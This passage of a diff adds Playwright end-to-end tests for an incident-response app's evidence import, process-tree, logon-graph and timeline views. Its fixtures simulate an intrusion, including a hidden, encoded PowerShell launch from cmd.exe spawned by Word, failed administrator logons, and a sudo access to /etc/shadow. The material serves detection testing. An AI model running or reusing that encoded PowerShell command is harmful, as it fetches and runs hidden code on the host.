+  await shotWide('disk-usn', page.getByRole('tablist', { name: 'Parts of the disk page' }))
+  // The Timeline leaves the disk out until the Kind filter asks for it.
+  await expect(page.getByRole('tab', { name: /^Records/ })).toBeVisible()
+
+  expect((await page.request.delete('/api/incidents/e2e-s6-disk')).status()).toBe(204)
+  await backToMain()
+})
+
+test('a registry hive added on Endpoint Artifacts fills several rows: ShimCache with its own time, Run keys, services, and the SRUM page', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s6-hive', 'E2E-HIVE', 'windows')
+  await openEvidence('Endpoint Artifacts')
+  await page.getByRole('tab', { name: /^Program Execution/ }).click()
+  // The page says one hive fills several rows, and the rows that come out of a hive say so.
+  await expect(page.getByText('one hive fills several rows')).toBeVisible()
+  await expect(sourcesTable()).toContainText('from a registry hive')
+  const choices = page.getByLabel('Add files as')
+  await expect(
+    choices.locator('option', { hasText: 'Registry hive (SYSTEM, SOFTWARE, NTUSER.DAT, Amcache)' }),
+  ).toHaveCount(1)
+  await choices.selectOption({ label: 'Registry hive (SYSTEM, SOFTWARE, NTUSER.DAT, Amcache)' })
+  const hive = await addEvidence('SYSTEM', fixture('stage6/SYSTEM'), /complete|read in part/)
+  // The row of the hive is named by what it gave, and the rows it fills are no longer grey.
+  await expect(hive).toContainText('ShimCache', { timeout: 30_000 })
+  await expect(
+    sourcesTable().locator('tbody tr').filter({ hasText: 'Not imported' }).filter({ hasText: 'ShimCache' }),
+  ).toHaveCount(0)
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 30_000 })
+  await expect(recordsTable()).toContainText('cmd.exe')
+  // ShimCache's time is the time of the file, and the page says it is not a time of execution.
+  const source = page.getByRole('combobox', { name: 'Source', exact: true })
+  await source.selectOption(await source.locator('option', { hasText: /^ShimCache/ }).getAttribute('value'))
+  await expect(page.getByRole('columnheader', { name: /File modified/ })).toBeVisible()
+  await expect(page.getByText('not an execution time')).toBeVisible()
+  await shotWide('endpoint-hive', page.getByRole('tablist', { name: 'Artifact category' }))
+
+  // The same hive's services are in Persistence; a SOFTWARE hive adds the Run keys.
+  await page.getByRole('tab', { name: /^Persistence/ }).click()
+  await expect(recordsTable()).toContainText('Spooler', { timeout: 30_000 })
+  await page.getByLabel('Add files as').selectOption({ label: 'Registry hive (SYSTEM, SOFTWARE, NTUSER.DAT, Amcache)' })
+  await addEvidence('SOFTWARE', fixture('stage6/SOFTWARE'), /complete|read in part/)
+  await expect(sourcesTable().locator('tbody tr').filter({ hasText: 'SOFTWARE' })).toContainText('Run keys', {
+    timeout: 30_000,
+  })
+
+  // Network usage: one file, SRUDB.dat, gives two rows; there is none here, so the page says where to find it.
+  await page.getByRole('tab', { name: /^Network usage/ }).click()
+  await expect(sourcesTable()).toContainText('from SRUDB.dat')
+  await expect(page.getByLabel('Add files as').locator('option', { hasText: 'SRUDB.dat (SRUM)' })).toHaveCount(1)
+  await shotWide('endpoint-network-usage', page.getByRole('tablist', { name: 'Artifact category' }))
+
+  expect((await page.request.delete('/api/incidents/e2e-s6-hive')).status()).toBe(204)
+  await backToMain()
+})
+
+test('Event Logs of a Linux incident: the sources of Linux, an auth.log read, its events that matter, and a detection of the Nik pack', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s6-linux', 'web01', 'linux')
+  await openEvidence('Event Logs')
+  // Linux expects the auth log, the journal and the audit log, with where each is; nothing of Windows.
+  await expect(sourcesTable()).toContainText('Linux logs')
+  await expect(sourcesTable()).toContainText('/var/log/auth.log')
+  await expect(sourcesTable()).toContainText('journalctl')
+  await expect(sourcesTable()).toContainText('/var/log/audit/audit.log')
+  await expect(sourcesTable()).not.toContainText('winevt')
+  const row = await addEvidence('auth.log', AUTH_LOG, /complete|read in part/)
+  await expect(row).toContainText('Auth log')
+  const parts = page.getByRole('tablist', { name: 'Parts of the logs' })
+  await expect(parts.getByRole('tab', { name: /^Events/ })).toBeVisible({ timeout: 30_000 })
+  // "Events that matter" keeps the logons, the failed logons, sudo, accounts and processes.
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 30_000 })
+  await expect(recordsTable()).toContainText('Failed logon')
+  await expect(recordsTable()).toContainText('sshd')
+  await expect(recordsTable()).toContainText('198.51.100.9')
+  await page
+    .getByRole('tabpanel', { name: 'Events' })
+    .getByRole('combobox', { name: 'Type', exact: true })
+    .selectOption({ label: 'sudo' })
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(1, { timeout: 20_000 })
+  await expect(recordsTable()).toContainText('/etc/shadow')
+  await page
+    .getByRole('tabpanel', { name: 'Events' })
+    .getByRole('combobox', { name: 'Type', exact: true })
+    .selectOption({ label: 'All types' })
+  await expect(parts.getByRole('tab', { name: /^Detections\s*[1-9]/ })).toBeVisible({ timeout: 60_000 })
+  await shotWide('eventlogs-linux', parts)
+  await parts.getByRole('tab', { name: /^Detections/ }).click()
+  await expect(page.getByRole('tabpanel', { name: 'Detections' })).toContainText('Rule by Nik', { timeout: 30_000 })
+
+  expect((await page.request.delete('/api/incidents/e2e-s6-linux')).status()).toBe(204)
+  await backToMain()
+})
+
+test('a collection is listed, three of its files are imported, their pages show them, and a program is listed for Malware Analysis', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s6-zip', 'E2E-ZIP', 'windows')
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Evidence', exact: true }).click()
+  await page
+    .getByLabel('A collection to import')
+    .setInputFiles({ name: 'triage.zip', mimeType: 'application/zip', buffer: fixture('stage6/triage.zip') })
+  const dialog = page.getByRole('dialog', { name: /^Collection: triage\.zip/ })
+  await expect(dialog).toBeVisible({ timeout: 30_000 })
+  // The member list: tabs with counts, a search, the sections as checkboxes.
+  const tabs = dialog.getByRole('tablist', { name: 'Files of the collection' })
+  await expect(tabs.getByRole('tab', { name: /^All\s*6/ })).toBeVisible({ timeout: 60_000 })
+  await expect(tabs.getByRole('tab', { name: /^Importable\s*[1-9]/ })).toBeVisible()
+  await expect(tabs.getByRole('tab', { name: /^Programs\s*1/ })).toBeVisible()
+  await expect(dialog.getByRole('table')).toContainText('payload.exe')
+  await shot('collection-dialog-list', dialog)
+  // A program is listed with "Analyse" and never imported as evidence.
+  await expect(
+    dialog.getByRole('row').filter({ hasText: 'payload.exe' }).getByRole('button', { name: 'Analyse' }),
+  ).toBeVisible()
+  await expect(dialog.getByRole('checkbox', { name: /Pick .*payload\.exe/ })).toBeDisabled()
+
+  // Three files are picked and imported; the progress is what the server says.
+  for (const name of [/Pick .*config\/SYSTEM$/, /Pick .*config\/SOFTWARE$/, /Pick .*\$MFT$/]) {
+    await dialog.getByRole('checkbox', { name }).check()
+  }
+  await page.route('**/evidence/collections/*', async (route) => {
+    if (route.request().method() !== 'GET') return route.continue()
+    const response = await route.fetch()
+    const body = await response.json()
+    body.collection.state = 'importing'
+    body.collection.members = {
+      ...(body.collection.members ?? {}),
+      importing: {
+        total: 3,
+        done: 1,
+        already: 0,
+        failed: 0,
+        current: 'C/Windows/System32/config/SOFTWARE',
+        error: null,
+      },
+    }
+    return route.fulfill({ response, json: body })
+  })
+  await dialog.getByRole('button', { name: 'Import 3 files' }).click()
+  await expect(dialog.getByText('1 of 3 imported')).toBeVisible({ timeout: 20_000 })
+  await shot('collection-dialog-importing', dialog)
+  await page.unroute('**/evidence/collections/*')
+  await expect(tabs.getByRole('tab', { name: /^Already imported\s*3/ })).toBeVisible({ timeout: 90_000 })
+  await dialog.getByRole('button', { name: 'Close' }).last().click()
+
+  // The collection has its row in the block of the Evidence page, and the files its row in their pages.
+  const block = page.getByRole('region', { name: 'Collections' })
+  await expect(block).toContainText('triage.zip')
+  await expect(block).toContainText('3 imported')
+  await shot('evidence-collections-block', block)
+  await openEvidence('Disk (NTFS)')
+  await expect(sourcesTable()).toContainText('from triage.zip', { timeout: 30_000 })
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 60_000 })
+  await openEvidence('Endpoint Artifacts')
+  await page.getByRole('tab', { name: /^Program Execution/ }).click()
+  await expect(sourcesTable()).toContainText('from triage.zip', { timeout: 30_000 })
+
+  expect((await page.request.delete('/api/incidents/e2e-s6-zip')).status()).toBe(204)
+  await backToMain()
+})
+
+test('a disk image is refused with the sentence that says what to do', async () => {
+  test.setTimeout(120_000)
+  await openFreshIncidentOf('e2e-s6-vhdx', 'E2E-VHDX', 'windows')
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Evidence', exact: true }).click()
+  await page.getByLabel('A collection to import').setInputFiles({
+    name: 'disk.vhdx',
+    mimeType: 'application/octet-stream',
+    buffer: Buffer.from('vhdxfile' + 'x'.repeat(600)),
+  })
+  const toast = page.getByRole('status').filter({ hasText: 'disk.vhdx' })
+  await expect(toast).toContainText('disk image', { timeout: 30_000 })
+  await expect(toast).toContainText('Mount the image')
+  await shot('collection-refused', toast)
+  // Nothing was kept: no collection row, no source.
+  await expect(page.getByRole('region', { name: 'Collections' })).toHaveCount(0)
+  expect((await page.request.delete('/api/incidents/e2e-s6-vhdx')).status()).toBe(204)
+  await backToMain()
+})
+
+test('a file dropped on the Summary page goes to its section, and the toast says where', async () => {
+  test.setTimeout(180_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s6-drop', 'E2E-DROP', 'windows')
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
+  const transfer = await page.evaluateHandle((content) => {
+    const data = new DataTransfer()
+    data.items.add(new File([content], 'nik-eventlogs.json', { type: 'application/json' }))
+    return data
+  }, fixture('nik-eventlogs.json').toString())
+  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
+  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
+  // The app asks where it goes (this incident), and does not ask what it is: the server recognises it.
+  const dialog = page.getByRole('dialog', { name: 'Add a file' })
+  await expect(dialog).toContainText('Host evidence')
+  await dialog.getByRole('button', { name: 'Import', exact: true }).click()
+  const toast = page.getByRole('status').filter({ hasText: 'nik-eventlogs.json → Event Logs' })
+  await expect(toast).toBeVisible({ timeout: 60_000 })
+  await shot('drop-auto-toast', toast)
+  await toast.getByRole('button', { name: /Open Event Logs/ }).click()
+  await expect(page.getByRole('region', { name: /^Sources/ })).toBeVisible()
+  await waitRead('nik-eventlogs.json')
+  expect((await page.request.delete('/api/incidents/e2e-s6-drop')).status()).toBe(204)
+  await backToMain()
+})
+
+/** Back to the incident the other tests work on (nothing to go back to when only some tests run). */
+async function backToMain() {
+  if (mainIncident) await openIncidentAt(mainIncident)
+}
+
 test('the app runs under its security headers, and the policy blocked nothing', async ({ request }) => {
   const headers = (await request.get('/')).headers()
-  expect(headers['content-security-policy']).toContain("script-src 'self' 'wasm-unsafe-eval'")
+  expect(headers['content-security-policy']).toContain("script-src 'self'")
   expect(headers['content-security-policy']).toContain("frame-ancestors 'none'")
   expect(headers['x-content-type-options']).toBe('nosniff')
   expect(headers['x-frame-options']).toBe('DENY')
@@ -8579,4 +9765,514 @@ test('the API is reachable through the same origin', async ({ request }) => {
   expect(health.ok()).toBeTruthy()
   const ready = await request.get('/api/ready')
   expect(ready.ok()).toBeTruthy()
+})
+
+test('a zip dropped on the Summary page is a sample; the same zip through "Import a collection…" is a collection', async () => {
+  test.setTimeout(240_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s6-zipdrop', 'E2E-ZIPDROP', 'windows')
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Summary', exact: true }).click()
+  const zip = fixture('stage6/triage.zip').toString('base64')
+  const transfer = await page.evaluateHandle((base64) => {
+    const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
+    const data = new DataTransfer()
+    data.items.add(new File([bytes], 'triage.zip', { type: 'application/zip' }))
+    return data
+  }, zip)
+  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
+  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
+  // As in 6.x: a zip is how samples arrive, so it goes to Malware Analysis, not to the collections.
+  const dialog = page.getByRole('dialog', { name: 'Add a file' })
+  await expect(dialog).toContainText('Malware Analysis')
+  await expect(dialog.locator('#add-file-tab')).toHaveValue('malware')
+  await dialog.getByRole('button', { name: 'Import', exact: true }).click()
+  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('triage.zip', { timeout: 60_000 })
+
+  // The same file, on purpose: a collection.
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Evidence', exact: true }).click()
+  await page
+    .getByLabel('A collection to import')
+    .setInputFiles({ name: 'triage.zip', mimeType: 'application/zip', buffer: fixture('stage6/triage.zip') })
+  await expect(page.getByRole('dialog', { name: /^Collection: triage\.zip/ })).toBeVisible({ timeout: 30_000 })
+  await page.keyboard.press('Escape')
+  expect((await page.request.delete('/api/incidents/e2e-s6-zipdrop')).status()).toBe(204)
+  await backToMain()
+})
+
+// ---------------------------------------------------------------------------------------------------------------
+// 7.0 stage 7: processes, logons and the lateral graph, gaps and bursts, the stack panel, the search of evidence.
+// ---------------------------------------------------------------------------------------------------------------
+
+const MD5 = 'd41d8cd98f00b204e9800998ecf8427e'
+const SHA256 = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
+
+/** A Sysmon event of nik-eventlogs.json: `Id` 1 starts a process, 5 ends one. */
+const sysmon = (id, record, time, data) => ({
+  LogName: 'Microsoft-Windows-Sysmon/Operational',
+  Id: id,
+  RecordId: record,
+  TimeCreated: time,
+  MachineName: 'WKS-PROC-01',
+  ProviderName: 'Microsoft-Windows-Sysmon',
+  Level: 4,
+  Data: { User: 'CORP\\j.alvarez', LogonId: '0x3e7', ...data },
+})
+
+/** winword.exe (its parent, explorer.exe, is not in the evidence) starts cmd.exe, which starts an encoded powershell.exe. */
+const PROCESS_LOG = JSON.stringify({
+  format: 'nik-eventlogs',
+  host: 'WKS-PROC-01',
+  events: [
+    sysmon(1, 9001, '2026-11-17T14:02:30Z', {
+      ProcessId: 4100,
+      ParentProcessId: 1800,
+      Image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
+      CommandLine: '"WINWORD.EXE" /n "C:\\Users\\j.alvarez\\Downloads\\invoice.docm"',
+      ProcessGuid: '{00000001-0000-0000-0000-000000000001}',
+      ParentProcessGuid: '{00000001-0000-0000-0000-0000000000ff}',
+      ParentImage: 'C:\\Windows\\explorer.exe',
+      ParentCommandLine: 'C:\\Windows\\Explorer.EXE',
+      Hashes: `MD5=${MD5},SHA256=${SHA256}`,
+    }),
+    sysmon(1, 9002, '2026-11-17T14:02:37Z', {
+      ProcessId: 4200,
+      ParentProcessId: 4100,
+      Image: 'C:\\Windows\\System32\\cmd.exe',
+      CommandLine: 'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
+      ProcessGuid: '{00000001-0000-0000-0000-000000000002}',
+      ParentProcessGuid: '{00000001-0000-0000-0000-000000000001}',
+      ParentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
+      Hashes: `MD5=${MD5}`,
+    }),
+    sysmon(1, 9003, '2026-11-17T14:02:39Z', {
+      ProcessId: 4300,
+      ParentProcessId: 4200,
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+      CommandLine: 'powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
+      ProcessGuid: '{00000001-0000-0000-0000-000000000003}',
+      ParentProcessGuid: '{00000001-0000-0000-0000-000000000002}',
+      ParentImage: 'C:\\Windows\\System32\\cmd.exe',
+    }),
+    sysmon(5, 9004, '2026-11-17T14:03:24Z', {
+      ProcessId: 4300,
+      ProcessGuid: '{00000001-0000-0000-0000-000000000003}',
+      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+    }),
+  ],
+})
+
+const PROCESS_PARTS = () => page.getByRole('tablist', { name: 'Parts of the event logs' })
+
+test('Processes: a Sysmon tree with its ghost parent and a chain detection, the detail of a process, the filtered list, the keys', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s7-proc', 'WKS-PROC-01', 'windows')
+  await openEvidence('Event Logs')
+  await addEvidence('nik-eventlogs.json', PROCESS_LOG)
+  const parts = PROCESS_PARTS()
+  await expect(parts.getByRole('tab', { name: /^Processes\s*3/ })).toBeVisible({ timeout: 60_000 })
+  await parts.getByRole('tab', { name: /^Processes/ }).click()
+
+  const tree = page.getByRole('tree', { name: /^Processes of WKS-PROC-01/ })
+  const refresh = page.getByRole('button', { name: 'Refresh', exact: true })
+  const winword = tree.getByRole('treeitem').filter({ hasText: 'WINWORD.EXE' })
+  // The file is "done" a little before its tree and its levels are there: ask again.
+  await expect(async () => {
+    await refresh.click()
+    await expect(winword).toBeVisible({ timeout: 4_000 })
+  }).toPass({ timeout: 60_000 })
+  // The parent the log names and the evidence does not hold is a greyed row above its child.
+  await expect(tree.getByRole('treeitem').first()).toContainText('explorer.exe · not in the evidence')
+  await expect(winword).toContainText('1 child')
+
+  // Open by the keyboard: Right opens, Down moves, Right opens again.
+  await winword.focus()
+  await page.keyboard.press('ArrowRight')
+  const cmd = tree.getByRole('treeitem').filter({ hasText: /cmd\.exe/ })
+  await expect(cmd).toBeVisible({ timeout: 20_000 })
+  await page.keyboard.press('ArrowDown')
+  await expect(cmd).toBeFocused()
+  await page.keyboard.press('ArrowRight')
+  const powershell = tree.getByRole('treeitem').filter({ hasText: /powershell\.exe/ })
+  await expect(powershell).toBeVisible({ timeout: 20_000 })
+  // The chain rule that matched shows on its node: the level badge, and its detections count.
+  await expect(cmd).toContainText(/medium|high|critical/)
+  await expect(powershell).toContainText('45 s')
+  await page.keyboard.press('ArrowLeft') // closes cmd.exe
+  await expect(powershell).toHaveCount(0)
+  await page.keyboard.press('ArrowRight')
+  await expect(powershell).toBeVisible()
+  await page.keyboard.press('ArrowLeft')
+  await page.keyboard.press('ArrowLeft') // to its parent
+  await expect(winword).toBeFocused()
+  await page.keyboard.press('ArrowRight')
+  await shot('processes-tree', tree)
+
+  // The detail: the whole command line, the hashes, the ancestors and the detections of the record.
+  await cmd.click()
+  const drawer = page.getByRole('complementary', { name: 'Process cmd.exe' })
+  await expect(drawer).toBeVisible()
+  await expect(drawer).toContainText('-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA')
+  await expect(drawer).toContainText(MD5)
+  await expect(drawer.getByRole('region', { name: 'Ancestors' })).toContainText('explorer.exe — not in the evidence')
+  await expect(
+    drawer.getByRole('region', { name: 'Ancestors' }).getByRole('button', { name: /WINWORD\.EXE/ }),
+  ).toBeVisible()
+  await expect(
+    drawer.getByRole('region', { name: 'Children' }).getByRole('button', { name: /powershell\.exe/ }),
+  ).toBeVisible()
+  await expect(drawer.getByRole('region', { name: 'Detections of this process' })).toContainText(
+    'Office Application Starts a Script Host or a Shell',
+    { timeout: 20_000 },
+  )
+  await expect(drawer.getByRole('region', { name: 'Detections of this process' })).toContainText('Rule by Nik')
+  await shot('process-drawer', drawer)
+  // An ancestor opens its own detail; "Open the event" shows the original record.
+  await drawer
+    .getByRole('region', { name: 'Ancestors' })
+    .getByRole('button', { name: /WINWORD\.EXE/ })
+    .click()
+  await expect(page.getByRole('complementary', { name: 'Process WINWORD.EXE' })).toBeVisible()
+  await page
+    .getByRole('complementary', { name: 'Process WINWORD.EXE' })
+    .getByRole('button', { name: 'Open the event' })
+    .click()
+  const viewer = page.getByRole('dialog', { name: 'Source of the record' })
+  await expect(viewer).toBeVisible({ timeout: 20_000 })
+  await expect(viewer).toContainText('WINWORD.EXE')
+  await page.keyboard.press('Escape')
+  await expect(viewer).toBeHidden()
+
+  // A filter makes a flat list; each row shows its ancestors.
+  const filter = page.getByRole('textbox', { name: 'Image or command' })
+  await filter.fill('powershell')
+  await filter.press('Enter')
+  const flat = page.getByRole('list', { name: 'Processes that match' })
+  await expect(flat.getByRole('listitem')).toHaveCount(2, { timeout: 20_000 })
+  await expect(flat).toContainText('WINWORD.EXE › cmd.exe ›', { timeout: 20_000 })
+  await shot('processes-filtered', flat)
+  // "Show in the tree" puts the process in its place, selected.
+  await flat
+    .getByRole('listitem')
+    .filter({ hasText: /^powershell\.exe|powershell\.exe/ })
+    .last()
+    .getByRole('button', { name: 'Show in the tree' })
+    .click()
+  await expect(tree).toBeVisible({ timeout: 20_000 })
+  await expect(tree.getByRole('treeitem', { selected: true })).toContainText('powershell')
+
+  // The detection of the rule is also in the Detections tab and on the Events row of the process.
+  await parts.getByRole('tab', { name: /^Detections/ }).click()
+  await expect(page.getByRole('tabpanel', { name: /Detections/ })).toContainText(
+    'Office Application Starts a Script Host or a Shell',
+    { timeout: 30_000 },
+  )
+  await parts.getByRole('tab', { name: /^Events/ }).click()
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 30_000 })
+  await expect(recordsTable().getByRole('row').filter({ hasText: 'cmd.exe' }).first()).toContainText(
+    /medium|high|critical/,
+    {
+      timeout: 20_000,
+    },
+  )
+
+  // Settings → Sigma rules lists the pack of the chains, with its own entry in the pack filter.
+  const settings = await openSettingsAt('/settings/rules/sigma')
+  const pack = settings.getByRole('combobox', { name: 'Pack' })
+  await expect(pack.locator('option', { hasText: 'Nik process chains' })).toHaveCount(1, { timeout: 30_000 })
+  await pack.selectOption({ label: 'Nik process chains' })
+  await expect(
+    settings.getByRole('row').filter({ hasText: 'Office Application Starts a Script Host or a Shell' }),
+  ).toBeVisible({
+    timeout: 30_000,
+  })
+
+  expect((await page.request.delete('/api/incidents/e2e-s7-proc')).status()).toBe(204)
+  await backToMain()
+})
+
+/** A logon of the Security channel: 4624 (success) or 4625 (failure) recorded by `machine`. */
+const securityLogon = (record, time, machine, id, data) => ({
+  LogName: 'Security',
+  Id: id,
+  RecordId: record,
+  TimeCreated: time,
+  MachineName: machine,
+  ProviderName: 'Microsoft-Windows-Security-Auditing',
+  Level: 0,
+  Data: { TargetDomainName: 'CORP', LogonType: '3', TargetLogonId: `0x${record}`, ...data },
+})
+
+/** Three hosts: WKS-01 reaches SRV-A (three times), SRV-A reaches SRV-B (twice), and an address fails at SRV-A (twice). */
+const LOGON_LOG = JSON.stringify({
+  format: 'nik-eventlogs',
+  host: 'SRV-A',
+  events: [
+    ...[0, 1, 2].map((n) =>
+      securityLogon(7100 + n, `2026-11-17T09:0${n}:00Z`, 'SRV-A', 4624, {
+        TargetUserName: 'j.alvarez',
+        IpAddress: '10.0.0.11',
+        WorkstationName: 'WKS-01',
+      }),
+    ),
+    ...[0, 1].map((n) =>
+      securityLogon(7200 + n, `2026-11-17T09:1${n}:00Z`, 'SRV-B', 4624, {
+        TargetUserName: 'svc.backup',
+        LogonType: '10',
+        IpAddress: '10.0.0.20',
+        WorkstationName: 'SRV-A',
+      }),
+    ),
+    ...[0, 1].map((n) =>
+      securityLogon(7300 + n, `2026-11-17T09:2${n}:00Z`, 'SRV-A', 4625, {
+        TargetUserName: 'administrator',
+        IpAddress: '203.0.113.45',
+        Status: '0xc000006d',
+        SubStatus: '0xc000006a',
+      }),
+    ),
+  ],
+})
+
+test('Logons: the table, the lateral graph, a click on an edge filters the table, hover says users and types', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s7-logon', 'SRV-A', 'windows')
+  await openEvidence('Event Logs')
+  await addEvidence('nik-eventlogs.json', LOGON_LOG)
+  const parts = PROCESS_PARTS()
+  await expect(parts.getByRole('tab', { name: /^Logons\s*7/ })).toBeVisible({ timeout: 60_000 })
+  await parts.getByRole('tab', { name: /^Logons/ }).click()
+
+  const graph = page.getByRole('img', { name: 'Lateral movement between machines' })
+  await expect(graph.locator('[data-edge]')).toHaveCount(3, { timeout: 30_000 })
+  await expect(graph.locator('[data-node]')).toHaveCount(4)
+  // The SVG has a description, and the table under it is the text alternative.
+  await expect(graph.locator('desc')).toContainText('the table under the graph lists every logon')
+  const rows = recordsTable().locator('tbody tr')
+  await expect(rows).toHaveCount(7, { timeout: 30_000 })
+  await expect(recordsTable()).toContainText('network')
+  await expect(recordsTable()).toContainText('remote interactive')
+  await expect(recordsTable()).toContainText('203.0.113.45')
+  await shot('logons-graph', page.getByRole('region', { name: 'Lateral movement' }))
+
+  // Hover: the users and the types of the edge.
+  await graph.locator('[data-edge="host:wks-01>host:srv-a"]').hover({ force: true })
+  const tip = page.getByRole('status').filter({ hasText: 'WKS-01 → SRV-A' })
+  await expect(tip).toContainText('3 logons')
+  await expect(tip).toContainText('Users: j.alvarez')
+  await expect(tip).toContainText('Types: network')
+  await shot('logons-graph-hover', page.getByRole('region', { name: 'Lateral movement' }))
+
+  // A click on the edge filters the table to it.
+  await graph.locator('[data-edge="host:wks-01>host:srv-a"]').dispatchEvent('click')
+  await expect(rows).toHaveCount(3, { timeout: 20_000 })
+  await expect(page.getByText('The table shows the logons from WKS-01 to SRV-A.')).toBeVisible()
+  await shot('logons-table', recordsTable())
+  // The edge of failures is red in the picture and filters to the address.
+  await page.getByRole('button', { name: 'Show all' }).click()
+  await expect(rows).toHaveCount(7, { timeout: 20_000 })
+  await graph.locator('[data-edge="address:203.0.113.45>host:srv-a"]').dispatchEvent('click')
+  await expect(rows).toHaveCount(2, { timeout: 20_000 })
+  await expect(rows.first()).toContainText('failure')
+  // A click on a machine: what it recorded, or what came from it.
+  await graph.locator('[data-node="host:srv-a"]').dispatchEvent('click')
+  await expect(rows).toHaveCount(5, { timeout: 20_000 })
+  await page.getByRole('button', { name: /^out/ }).click()
+  await expect(rows).toHaveCount(2, { timeout: 20_000 })
+  await expect(recordsTable()).toContainText('svc.backup')
+  // The filters of the table narrow the graph: failures only leave one edge.
+  await page.getByRole('button', { name: 'Show all' }).click()
+  await page.getByRole('combobox', { name: 'Outcome' }).selectOption({ label: 'failure' })
+  await expect(graph.locator('[data-edge]')).toHaveCount(1, { timeout: 20_000 })
+  await page.getByRole('combobox', { name: 'Outcome' }).selectOption({ label: 'Any outcome' })
+  await expect(graph.locator('[data-edge]')).toHaveCount(3, { timeout: 20_000 })
+  // The minimum count hides the edges below it.
+  await page.getByRole('slider', { name: /Minimum count/ }).fill('3')
+  await expect(graph.locator('[data-edge]')).toHaveCount(1, { timeout: 20_000 })
+
+  expect((await page.request.delete('/api/incidents/e2e-s7-logon')).status()).toBe(204)
+  await backToMain()
+})
+
+/** An Application event, `n` minutes after 06:00 of 2026-11-17 UTC. */
+const appEvent = (record, minutes, text) => ({
+  LogName: 'Application',
+  Id: 1000,
+  RecordId: record,
+  TimeCreated: new Date(Date.UTC(2026, 10, 17, 6, minutes)).toISOString().replace('.000Z', 'Z'),
+  MachineName: 'WKS-GAP-01',
+  ProviderName: 'Application Error',
+  Level: 4,
+  Data: { Application: `${text}.exe` },
+})
+
+/** One event an hour from 06:00 to 09:00, nothing until 14:00 (a gap of five hours), then forty events within a minute (a burst) and an hour more. */
+const GAP_LOG = JSON.stringify({
+  format: 'nik-eventlogs',
+  host: 'WKS-GAP-01',
+  events: [
+    ...[0, 60, 120, 180].map((minutes, n) => appEvent(5000 + n, minutes, `early${n}`)),
+    ...Array.from({ length: 40 }, (_, n) => appEvent(5100 + n, 480 + (n % 3), `burst${n}`)),
+    appEvent(5200, 540, 'late0'),
+    appEvent(5201, 600, 'late1'),
+  ],
+})
+
+test('Timeline: a gap and a burst are marked on the density, listed, and the thresholds are remembered', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s7-gap', 'WKS-GAP-01', 'windows')
+  await openEvidence('Event Logs')
+  await addEvidence('nik-eventlogs.json', GAP_LOG)
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
+  const density = page.getByRole('group', { name: 'Events in time' })
+  await expect(density).toBeVisible({ timeout: 30_000 })
+  // The defaults: gap 2 h, burst 5 times the usual.
+  await expect(page.getByRole('combobox', { name: 'Gap ≥' })).toHaveValue('120')
+  await expect(page.getByRole('combobox', { name: 'Burst ≥' })).toHaveValue('5')
+  await expect(
+    page.getByText(/^1 gap, the longest 4 h \d+ min · 1 burst$|^\d+ gaps?, the longest .* · 1 burst$/),
+  ).toBeVisible({
+    timeout: 30_000,
+  })
+  await expect(density.locator('[data-gap]')).toHaveCount(1)
+  await expect(density.getByRole('button', { name: /burst, \d+(\.\d+)?× the usual/ })).toHaveCount(1)
+  await shot('timeline-gaps-bursts', page.getByRole('region', { name: /Events in time/ }).or(density))
+
+  // An item of the line sets the range of the page to the gap.
+  await page
+    .getByRole('button', { name: /^gap · / })
+    .first()
+    .click()
+  await expect(page.getByRole('textbox', { name: 'From' })).not.toHaveValue('')
+  // A higher threshold: the gap of 4 h is not one at 6 h.
+  await page.getByRole('combobox', { name: 'Gap ≥' }).selectOption({ label: '6 h' })
+  await expect(density.locator('[data-gap]')).toHaveCount(0, { timeout: 20_000 })
+  await page.getByRole('combobox', { name: 'Burst ≥' }).selectOption({ label: '10× usual' })
+  // The choice is kept: after a reload the thresholds are the same.
+  await page.reload()
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
+  await expect(page.getByRole('combobox', { name: 'Gap ≥' })).toHaveValue('360')
